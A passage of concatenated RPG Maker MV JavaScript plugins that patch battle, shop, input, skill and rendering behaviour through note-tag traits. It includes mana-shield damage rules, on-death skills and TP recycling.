	return newid;
};
}

if(!Utils.isOptionValid('test')){
new cfc(Game_Event.prototype).add('update',function f(){
	return this.event()&&f.ori.apply(this,arguments);
}).add('findProperPageIndex',function f(){
	return this.event()?f.ori.apply(this,arguments):-1;
});
}

})();


﻿"use strict";
/*:
 * @plugindesc 使用技能時在特定時機點執行javascript
 * @author agold404
 * @help 
 * 'createSetupActions',
 * 'createWholeActions',
 * 'createTargetActions',
 * 'createFollowActions',
 * 'createFinishActions',
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;


{ const p=BattleManager;
const kv=[
'createSetupActions',
'createWholeActions',
'createTargetActions',
'createFollowActions',
'createFinishActions',
];
for(let x=0;x!==kv.length;++x){
	k=kv[x];
	r=p[k]; (p[k]=function f(){
		if(this._action){
			const item=this._action.item();
			if(item && item.meta[f.tbl]){
				eval(item.meta[f.tbl]);
			}
		}
		return f.ori.apply(this,arguments);
	}).ori=r;
	p[k].tbl='script_'+k;
}
}


{ const p=Game_Action.prototype;
const tblv=[
['setItem',['$dataItems',]],
['setSkill',['$dataSkills',]],
];
for(let x=0;x!==tblv.length;++x){
	k=tblv[x][0];
	r=p[k]; (p[k]=function f(){
		if(!f.tbl[0]) f.tbl[0]=window[f.tbl[1][0]];
		const id=arguments[0];
		{
			const dataobj=f.tbl[0][id];
			const s=dataobj && dataobj.meta.script_atSet;
			if(s){ eval(s); }
		}
		return f.ori.apply(this,arguments);
	}).ori=r;
	(p[k].tbl=tblv[x])[0]=undefined;
}
}


})();


﻿"use strict";
/*:
 * @plugindesc note區改圖塊
 * @author agold404
 * @help <flags: JSON format object string >
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('onLoad_after_tileset',function f(obj){
	const rtv=f.ori.apply(this,arguments);
	obj.forEach(f.tbl[0]);
	return rtv;
},[
function f(obj){ if(!obj) return;
	const flags = obj.meta.flags && JSON.parse(obj.meta.flags);
	if(flags && flags!==true){ for(let i in flags){
		obj.flags[i]=flags[i];
	} }
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 建O(1)表
 * @author agold404
 * @help MV會被說爛ㄅ4沒有原因ㄉ
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Interpreter.prototype;
k='setup';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const arr=this._list;
	if(arr._labelIdx) return rtv;
	const tbl=arr._labelIdx={};
	for(let x=arr.length;x--;){
		if(arr[x].code === 118){
			tbl[arr[x].parameters[0]]=x;
		}
	}
	return rtv;
}).ori=r;
k='command119';
r=p[k]; (p[k]=function f(){
	const tbl=this._list._labelIdx;
	if(!tbl) return f.ori.apply(this,arguments);
	const i=tbl[this._params[0]];
	if(i>=0){
		this.jumpTo(i);
		return;
	}else return true;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 變數商店
 * @author agold404
 * @help MV會被說爛ㄅ4沒有原因ㄉ
 * 
 * $gameTemp.varShop = [作為金幣的變數id,iconId金幣圖];
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Interpreter.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	$gameTemp.varShop=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
k='command302';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const nsc=SceneManager._nextScene;
	if(nsc && nsc.constructor===Scene_Shop){
		nsc._varShop_interpreter=this;
		nsc._varShop_data=$gameTemp.varShop;
		$gameTemp.varShop=undefined;
	}
	return rtv;
}).ori=r;
}

{ const p=Scene_Shop.prototype;
k='create';
r=p[k]; (p[k]=function f(){
	if(this._varShop_data){
		this._bak_gold=$gameParty._gold;
		this._bak_icon=undefined;
		if( (typeof Yanfly!=='undefined') && Yanfly.Icon ){
			this._bak_icon=Yanfly.Icon.Gold;
			Yanfly.Icon.Gold=this._varShop_data[1];
		}
		$gameParty._gold=$gameVariables.value(this._varShop_data[0]);
	}
	return f.ori.apply(this,arguments);
}).ori=r;
k='terminate';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._varShop_data){
		$gameVariables.setValue(this._varShop_data[0],$gameParty._gold);
		$gameParty._gold=this._bak_gold;
		if(this._bak_icon>=0) Yanfly.Icon.Gold=this._bak_icon;
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 天使UCCU
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Window_SQSQuestsList!=='undefined')(()=>{ let k,r,t;

{ const p=Window_SQSQuestsList.prototype;
k='drawQuestActiveSymbol';
r=p[k]; (p[k]=function f(){
	let rtv;
	try{
		rtv=f.ori.apply(this,arguments);
	}catch(e){
		console.log(e+'');
		if(e+''==="TypeError: Cannot read properties of undefined (reading 'color')"){
			throw new Error("天使UCCU，別小看玩家。就跟你說我來修箭頭顏色的行為，從根本解決。你就只多加幾個相同顏色，湊顏色總數。");
		}
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 法力護盾
 * @author agold404
 * @help in note: <法力護盾:實數> 表受到傷害時，以"實數"倍的MP代替傷害，取最小。
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r; const gbb=Game_BattlerBase,kw='法力護盾';
if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kw).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	const val=meta[kw]-0;
	if(!isNaN(val)) dataobj.traits.push({code:gbb[kw],dataId:1,value:val});
};
}

{ const p=Game_Battler.prototype;
(p[kw]=function f(){
	return Math.min.apply(undefined,this.traits(gbb[kw]).map(f.forEach));
}).forEach=t=>t.value;
}

{ const p=Game_Action.prototype;
k='executeHpDamage';
r=p[k]; (p[k]=function f(trgt,val){
	if(val>0){ const 法力護盾=trgt[kw](); if(法力護盾!==Infinity){
		const mp=trgt.mp;
		let v2=parseInt(法力護盾*val);
		if(mp>=v2) return this.executeMpDamage(trgt,v2);
		else{
			v2=mp;
			arguments[1]=val-~~(v2/法力護盾);
			const rtv=f.ori.apply(this,arguments);
			this.executeMpDamage(trgt,v2);
			return rtv;
		}
	} }
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 法力護盾_減傷
 * @author agold404
 * @help in note: <法力護盾_減傷:固定減傷值,固定消耗MP值>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r; const gbb=Game_BattlerBase,kw='法力護盾_減傷';
if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kw).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const arr=meta[kw].split(',').map(Number);
		dataobj.traits.push({code:gbb[kw],dataId:1,value:[arr[0]||0,arr[1]||0]});
	}
};
}

{ const p=Game_Battler.prototype;
p[kw]=function f(){
	const arr=this.traits(gbb[kw]);
	if(!arr.length) return;
	let red=0,mpc=0;
	for(let x=0,xs=arr.length;x!==xs;++x){
		red+=arr[x].value[0];
		mpc+=arr[x].value[1];
	}
	return [red,mpc];
};
}

{ const p=Game_Action.prototype;
k='executeHpDamage';
r=p[k]; (p[k]=function f(trgt,val){
	if(val>0){ const 法力護盾_減傷=trgt[kw](); if(法力護盾_減傷){
		if(trgt.mp>=法力護盾_減傷[1]){
			arguments[1]=Math.max(0,parseInt(val-法力護盾_減傷[0]));
			const rtv=f.ori.apply(this,arguments);
			this.executeMpDamage(trgt,~~(法力護盾_減傷[1]));
			return rtv;
		}
	} }
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 法力護盾_無效
 * @author agold404
 * @help in note: <法力護盾_無效:最大無效值,無效時消耗MP值>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r; const gbb=Game_BattlerBase,kw='法力護盾_無效';
if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kw).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const arr=meta[kw].split(',').map(Number);
		dataobj.traits.push({code:gbb[kw],dataId:1,value:[arr[0]||0,arr[1]||0]});
	}
};
}

{ const p=Game_Battler.prototype;
p[kw]=function f(){
	const arr=this.traits(gbb[kw]);
	if(!arr.length) return;
	let ign=0,mpc=0;
	for(let x=0,xs=arr.length;x!==xs;++x){
		ign+=arr[x].value[0];
		mpc+=arr[x].value[1];
	}
	return [ign,mpc];
};
}

{ const p=Game_Action.prototype;
k='executeHpDamage';
r=p[k]; (p[k]=function f(trgt,val){
	if(val>0){ const 法力護盾_無效=trgt[kw](); if(法力護盾_無效){
		if(val<=法力護盾_無效[0] && trgt.mp>=法力護盾_無效[1]){
			return this.executeMpDamage(trgt,法力護盾_無效[1]);
		}
	} }
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc edit (Touch)Input.isLongPressed: add arg: wait frames
 * @author agold404
 * @help (Touch)Input.isLongPressed(keyName,waitFrameAsLong)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

k='isLongPressed';
[Input,TouchInput,].forEach(p=>{
	r=p[k]; (p[k]=function f(keyName,waitFramesAsLong){
		const bak=this.keyRepeatWait;
		if(waitFramesAsLong>=0) this.keyRepeatWait=waitFramesAsLong;
		const rtv=f.ori.apply(this,arguments);
		this.keyRepeatWait=bak;
		return rtv;
	}).ori=r;
});

})();


﻿"use strict";
/*:
 * @plugindesc 新增自定義N個特殊屬性，影響是否能使用技能
 * @author agold404
 * @help 使用note區
 * 角色、職業、武器、防具、敵人、狀態：<addEleLv:[add1,add2,...,addN]> 來增加角色/敵人的屬性等級
 * 
 * 技能：<needEleLv:[need1,need2,...,needN]> 來指定技能需求
 *
 * 預設總數上限N=0，欲更改，請往下找到 "const func_numEleType=()=>7;" ，將7改為你想要的數字。
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const func_numEleType=()=>0;


const traitkw='TRAIT_ADD_ELEMENT_LEVEL';

const gbb=Game_BattlerBase;
{ 
let gbbEnumMax=0;
for(let i in gbb) if((typeof (gbb[i]-0)==='number') && gbb[i]>gbbEnumMax) gbbEnumMax=gbb[i]-0;
gbb[traitkw]=++gbbEnumMax;
}

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta.addEleLv){
		const arr=JSON.parse(meta.addEleLv);
		for(let x=0,xs=func_numEleType();x!==xs;++x){
			dataobj.traits.push({code:gbb[traitkw],dataId:x,value:arr[x]-0||0});
		}
	}
};
}

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataSkills.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	dataobj.needEleLv=[];
	const meta=dataobj.meta;
	if(meta.needEleLv){
		const arr=JSON.parse(meta.needEleLv);
		for(let x=0,xs=func_numEleType();x!==xs;++x){
			dataobj.needEleLv[x]=arr[x]-0||0;
		}
	}
};
}

{ const p=Game_Battler.prototype;
p.getElementLevel=function(id){
	return this.traitsSum(gbb[traitkw],id);
};
p.meetsElementLevel=function(skill){
	for(let x=0,xs=func_numEleType();x!==xs;++x){
		if(this.getElementLevel(x)<skill.needEleLv[x]){
			return false;
		}
	}
	return true;
};
k='meetsSkillConditions';
r=p[k]; (p[k]=function f(skill){
	return this.meetsElementLevel(skill) && f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc Detect HW acceleration more with renderer string
 * @author agold404
 * @help PIXI's built-in uses 'failIfMajorPerformanceCaveat' option, which is unreliable
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=PIXI.utils;
k='isWebGLSupported';
r=p[k]; (p[k]=function f(){
	let renderer;
	{
		const canvas = document.createElement('canvas');
		let gl;
		try{
			gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
		}catch(e){
		}
		if(gl){
			const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
			//const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
			renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
		}
	}
	return renderer && renderer.indexOf(f.trgt)<0 && f.ori.apply(this,arguments);
}).ori=r;
p[k].trgt="SwiftShader";
}

})();


﻿"use strict";
/*:
 * @plugindesc 修正對話選項在尚未選取任一選項時按上會是選到倒數第2個而非最後一個的問題
 * @author agold404
 * @help 那個RMMV除了架構以外就是遜啦
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Window_Selectable.prototype;
k='cursorUp';
r=p[k]; (p[k]=function f(){
	if(this._index<0 && this.maxItems()) this._index=0;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc tbl from Character to Sprite
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Character.prototype;
k='setCharacter';
r=p[k]; (p[k]=function f(){
	{ const sc=SceneManager._scene; if(sc){
		if(!sc._chr2sp) sc._chr2sp = new Map();
		sc._chr2sp.set(arguments[0],this);
	} }
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc simple shortcut
 * @author agold404
 * @help 快捷列設計：
 * 單體恢復道具：1，ID 1
 * 復活道具：2，ID 91
 * 全體恢復道具：3，ID 121
 * 奇蹟系列道具：4，ID 211
 * 狀態道具：5，ID 241
 * 投擲道具：6，ID 281
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const idxv=[  1,  91, 121, 211, 241, 281,];
const keys=['1', '2', '3', '4', '5', '6',];

// check if param correct
for(let x=1;x!==idxv.length;++x) if(idxv[x-1]>=idxv[x]) throw new Error('param incorrect. should be strictly increasing');
for(let x=0,s=new Set();x!==keys.length;++x) if(s.has(keys[x])) throw new Error('param incorrect: repeated key'); else s.add(keys[x]);

idxv.push(Infinity);

new cfc(Scene_Battle.prototype).add('itemShortcutFly',function f(){
	const sc=SceneManager._scene;
	if(sc._partyCommandWindow.active) return;
	const cmdW=sc._actorCommandWindow,itemW=sc._itemWindow;
	let ch=-1;
	for(let x=0;x!==keys.length;++x) if(Input.isTriggered(keys[x])) ch=x;
	if(!(ch>=0)) return;
	for(let x=0,arr=[sc._actorWindow,sc._enemyWindow,sc._skillWindow];x!==arr.length;++x) if(arr[x].active) arr[x].processCancel();
	if(!itemW.active){
		if(!cmdW.active) return;
		let idx=-1;
		for(let x=0,arr=cmdW._list;x!==arr.length;++x) if(cmdW.isCommandEnabled(x) && arr[x].symbol==="item"){ idx=x; break; }
		cmdW._index=idx;
		cmdW.processOk();
	}
	for(let x=itemW._onTopEndIdx|0,arr=itemW._data;x!==arr.length;++x){ if(arr[x]){ const key=DataManager.getDataObjSortingKey(arr[x]); if(key>=f.tbl[0][ch] && key<f.tbl[0][ch+1]){
		itemW.select(Math.min(itemW.maxPageItems()-itemW.maxCols()+x,arr.length));
		itemW.select(x);
		break;
	} } }
},[
idxv,
],false,true).add('update',function f(){
	this.itemShortcutFly();
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc on die skill as a trait, but only in battle
 * @author agold404
 * @help <死時技能:[[skillId_1,priority_1],[skillId_2,priority_2],...]>
 * <死時技能:[[skillId_1,priority_1]]>
 * skillId = skill id in database
 * priority: Number. the less, the prior. If not provided, supposed 0.
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='死時技能';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

let emptySkillIdx;
new cfc(DataManager).add('onLoad_before_skill',function f(obj){
	const emptySkill={
		id:(emptySkillIdx=$dataSkills.length),animationId:0,
		damage:{critical:false,elementId:0,formula:"0",type:0,variance:20},
		description:"",effects:[],hitType:0,iconIndex:0,
		message1:"","message2":"",
		mpCost:0,name:"",note:"",occasion:0,repeats:1,
		requiredWtypeId1:0,requiredWtypeId2:0,
		scope:1,speed:Infinity,stypeId:0,successRate:100,
		tpCost:0,tpGain:0,meta:{},
	};
	obj.push(emptySkill);
	
	return f.ori&&f.ori.apply(this,arguments);
});


{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const arr=JSON.parse(meta[kw]);
		for(let x=0;x!==arr.length;++x){
			const sp=arr[x];
			dataobj.traits.push({code:gbb[kwt],dataId:sp[0],value:sp[1]});
		}
	}
};
}

{ const p=BattleManager;
k='endBattle';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	//$gameParty.members().forEach(f.forEach);
	this.onDieSkill_queue_clear();
	return rtv;
}).ori=r;
p[k].forEach=btlr=>btlr.onDieSkill_clearInfo();
p.onDieSkill_queue_get=function(){
	if(!this._onDieSkill_queue) (this._onDieSkill_queue=[])._map=new Map();
	return this._onDieSkill_queue;
};
p.onDieSkill_queue_clear=function(){
	if(this._onDieSkill_queue){
		this._onDieSkill_queue.length=0;
		this._onDieSkill_queue._map.clear();
	}else this.onDieSkill_queue_get();
};
p.onDieSkill_queue_push=function(btlr,acts){
	const arr=this.onDieSkill_queue_get();
	const m=arr._map;
	arr.push([btlr,acts.slice().reverse()]);
	m.set(btlr,(m.get(btlr)|0)+1);
};
p.onDieSkill_queue_pop=function(){
	const arr=this.onDieSkill_queue_get();
	if(!arr[0]) return console.warn("pop @ size = 0");
	const m=arr._map;
	const val=m.get(arr[0][0])-1;
	if(val) m.set(arr[0][0],val);
	else m.delete(arr[0][0]);
	return arr.shift()[0];
};
p.onDieSkill_queue_popAct=function(btlr){
	const arr=this.onDieSkill_queue_get();
	if(!arr[0]) return console.warn("popAct @ size = 0");
	return arr[0][1].pop();
};
p.onDieSkill_queue_curr=function(){
	const arr=this.onDieSkill_queue_get();
	return arr[0];
};
p.onDieSkill_queue_currAct=function(){
	const arr=this.onDieSkill_queue_get();
	const acts_r=arr[0] && arr[0][1];
	return acts_r && acts_r[acts_r.length-1];
};
p.onDieSkill_queue_has=function(btlr){
	const arr=this.onDieSkill_queue_get();
	const m=arr._map;
	return m.get(btlr)>0;
};
k='getNextSubject';
r=p[k]; (p[k]=function f(){
	const res=this.onDieSkill_queue_curr();
	if(res && this._action!==res[1][0]){
		res[0].setAction(0,this.onDieSkill_queue_popAct());
		if(!this.onDieSkill_queue_currAct()){
			const btlr=this.onDieSkill_queue_pop();
			btlr.refresh();
			if(btlr.isDead()) btlr.performCollapse();
		}
		return res[0];
	}
	return f.ori.apply(this,arguments);
}).ori=r;
k='getChargedATBBattler';
r=p[k]; (p[k]=function f(){
	const res=this.onDieSkill_queue_curr();
	if(res && this._action!==res[1][0]){
		res[0].setAction(0,this.onDieSkill_queue_popAct());
		if(!this.onDieSkill_queue_currAct()) this.onDieSkill_queue_pop().removeImmortal();
		return res[0];
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Enemy.prototype;
k='endTurnAllATB';
r=p[k]; (p[k]=function f(){
	this.refresh();
	return f.ori.apply(this,arguments);
}).ori=r;
}

new cfc(Game_Battler.prototype).add('onBattleEnd',function f(){
	this.onBattleEnd_onDieSkill();
	const isEnemyHidden=this.constructor===Game_Enemy&&this.isHidden();
	const rtv=f.ori.apply(this,arguments);
	if(isEnemyHidden) this.hide();
	return rtv;
}).add('onBattleEnd_onDieSkill',function f(){
	this.onDieSkill_clearInfo();
},undefined,false,true).add('onDieSkill_clearInfo',function(){
	this._onDieSkill_cache=
	this._onDieSkill_put=
	this._onDieSkill_end=
	undefined;
}).add('onDieSkill_getList',function f(){
	if(!this._onDieSkill_cache){
		const acts=this._onDieSkill_cache=[],arr=this.traits(Game_BattlerBase[kwt]).sort(f.tbl[0]).map(f.tbl[1]);
		if(arr.length) arr.push(emptySkillIdx); // see BattleManager.processForcedAction in YEP_X_BattleSysATB.js @ line 1410
		for(let x=0;x!==arr.length;++x){
			this.forceAction(arr[x],-1);
			const tmp=this.action(this.numActions()-1);
			if(tmp) acts.push(tmp);
		}
		for(let x=0;x!==acts.length;++x) this.setAction(x,acts[x]);
		if(0&&acts.length){
			// first dummy to be shifted for detecting canDoNext action
			const act=new Game_Action(this,true);
			acts.unshift(act); 
		}
	}
	return this._onDieSkill_cache;
},[
(a,b)=>a.value-b.value||a.dataId-b.dataId,
t=>t.dataId,
]).add('onDieSkill_action_battle',function(){
	const bm=BattleManager;
	if(!this.isStateAffected(this.deathStateId())){
		{
			const arr=this.onDieSkill_getList();
			if(!arr.length) return this.onDieSkill_clearInfo();
			if(!this._onDieSkill_put){
				bm.onDieSkill_queue_push(this,arr);
				this.clearActions();
				this._onDieSkill_put=true;
			}
		}
		return bm.onDieSkill_queue_has(this);
	}
	this.onDieSkill_clearInfo();
}).add('onDieSkill_action',function(){
	if(this.friendsUnit().inBattle()) return this.onDieSkill_action_battle();
/*
		if(!this.friendsUnit().inBattle()){
			for(let x=0,act;x!==sz;++x){
				act=this.action(x);
				if(act.item().occasion&1 || !act.isForFriend()) continue;
				
			}
			return this.onDieSkill_clearInfo();
		}
*/
}).add('addState',function f(){
	if(this.deathStateId()===arguments[0] && this.onDieSkill_action()) return;
	return f.ori.apply(this,arguments);
}).add('removeState',function f(){
	if(this.deathStateId()===arguments[0]) this.onDieSkill_clearInfo();
	return f.ori.apply(this,arguments);
}).add('regenerateAll',function f(){
	return !this._onDieSkill_put && f.ori.apply(this,arguments);
}).add('endTurnAllATB',function f(){
	return !this._onDieSkill_put && f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc "使用TP技能恢復使用的n" trait
 * @author agold404
 * @help <TP回收r:實數n>
 * <TP回收r:1>
 * <TP回收r:0.125>
 * <TP回收r:1.25>
 * 輸入負數會導致扣完原本的TP後再往下扣
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='TP回收r';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const n=dataobj.meta[kw]-0;
	if(n) dataobj.traits.push({code:gbb[kwt],dataId:1,value:n});
};
}

{ const p=Game_BattlerBase.prototype;
p.tpRecycleRate=function(){
	return this.traitsSum(Game_BattlerBase[kwt],1);
};
k='paySkillCost';
r=p[k]; (p[k]=function f(skill){
	const rtv=f.ori.apply(this,arguments);
	if(skill.tpCost>0) this.gainSilentTp(this.tpRecycleRate()*skill.tpCost);
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 狀態附魔，技能升級
 * @author agold404
 * @help 技能note中 <附魔升級:{"鍵值":skill_id}>
 * 狀態note中 <附魔類型:鍵值>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw1='附魔升級',kw2='附魔類型';
const kwt1='TRAIT_'+kw1;
const kwt2='TRAIT_'+kw2;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt1).
	addEnum(kwt2).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataSkills.forEach(f.tbl[0]);
	$dataStates.附魔狀態bitmask=[];
	$dataStates.附魔狀態arr=[];
	$dataStates.forEach(f.tbl[1]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ if(!dataobj) return;
	const v=dataobj.meta[kw1];
	if(v){
		try{
			dataobj[kw1]=JSON.parse(v);
		}catch(e){
			throw new Error('不是JSON.parse接受的字串:\n'+v+'\n'+e);
		}
	}
},function(dataobj,idx,arr){ if(!dataobj) return;
	arr.附魔狀態bitmask[idx]=0|0;
	const v=dataobj.meta[kw2];
	if(v){
		const t={code:gbb[kwt2],dataId:v,value:1};
		dataobj.traits.push(t);
		arr.附魔狀態bitmask[idx]=t;
		arr.附魔狀態arr.push(idx);
	}
},
];
}

{ const p=Game_Battler.prototype;
(p.附魔狀態=function f(){
	return this.states().find(f.forEach,$dataStates.附魔狀態bitmask);
}).forEach=function(stat){ return stat && this[stat.id]; };
p.is附魔狀態=function(stateId){
	return $dataStates.附魔狀態bitmask[stateId];
};
k='addNewState';
r=p[k]; (p[k]=function f(stateId){
	if(this.is附魔狀態(stateId)) $dataStates.附魔狀態arr.forEach(f.forEach,this);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=function(idx){ this.eraseState(idx); };
}

{ const p=Game_Actor.prototype;
k='skills';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const stat=this.附魔狀態();
	if(stat) return rtv.map(f.forEach,$dataStates.附魔狀態bitmask[stat.id]);
	return rtv;
}).ori=r;
p[k].forEach=function(dataobj){
	return dataobj[kw1]?$dataSkills[dataobj[kw1][this.dataId]]||dataobj:dataobj;
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥時殘影效果
 * @author agold404
 * @help 需搭配 SceneManager._scene._btlr2sp
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const none=()=>{};

{ const p=BattleManager;
p.setAfterimage_getSp=function(btlr){
	const sc=SceneManager._scene;
	const m=sc&&sc._btlr2sp;
	return m&&m.get(btlr);
};
p.setAfterimageOff=function(btlr){
	const sp=this.setAfterimage_getSp(btlr); if(!sp) return;
	sp._afterimage_en=false;
};
p.setAfterimageOn=function(btlr,itvl,lifetime){
	const sp=this.setAfterimage_getSp(btlr); if(!sp) return;
	sp._afterimage_en=true;
	if(itvl===undefined) itvl=1<<2;
	else{ itvl|=0; if(!(itvl>0)) itvl=1; }
	sp._afterimage_itvl=itvl;
	if(lifetime===undefined) lifetime=1<<5;
	else{ lifetime|=0; if(!(lifetime>1)) lifetime=2; }
	sp._afterimage_lifetime=lifetime;
};
}

